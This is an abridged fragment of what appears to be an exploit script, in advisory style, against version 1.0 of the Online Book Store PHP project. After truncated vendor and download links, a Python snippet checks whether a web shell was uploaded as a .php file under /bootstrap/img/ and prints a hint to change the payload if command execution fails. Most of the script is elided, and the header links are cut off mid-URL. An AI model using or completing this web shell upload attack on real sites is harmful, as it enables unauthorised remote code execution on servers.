...
# Vendor Homepage: https://projectworlds.in/free-projects/php-projects/online-b>
# Software Link: https://github.com/projectworlds32/online-book-store-project-i>
# Version: 1.0
...
if random_file in r.text:
    ...
    if r.status_code == 200:
        print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + 
              '.php, however a simple command check failed to execute. Perhaps shell_exec is disabled? Try changing the payload.')
